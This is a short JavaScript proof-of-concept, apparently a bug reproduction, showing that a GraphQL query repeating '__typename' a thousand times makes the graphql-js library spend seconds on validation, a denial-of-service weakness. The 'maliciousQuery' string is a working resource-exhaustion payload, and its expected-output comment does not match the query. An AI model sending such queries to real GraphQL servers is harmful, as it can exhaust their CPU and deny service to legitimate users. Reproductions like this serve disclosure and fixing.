import { performance } from "perf_hooks";
import {
  graphql,
  GraphQLSchema,
  GraphQLObjectType,
  GraphQLString,
} from "graphql";

var schema = new GraphQLSchema({
  query: new GraphQLObjectType({
    name: "RootQueryType",
    fields: {
      hello: {
        type: GraphQLString,
        resolve() {
          return "world";
        },
      },
    },
  }),
});

const maliciousQuery = `{ ${"__typename ".repeat(1000)}}`;
// 1000 = Took 1999.3179998397827 milliseconds
// 2000 = Took 8064.870334148407 milliseconds

const startTime = performance.now();

graphql({ schema, source: maliciousQuery }).then((result) => {
  // Prints
  // {
  //   data: { hello: "world" }
  // }

  const endTime = performance.now();

  console.log(`Took ${endTime - startTime} milliseconds`);

  console.log(JSON.stringify(result));
});
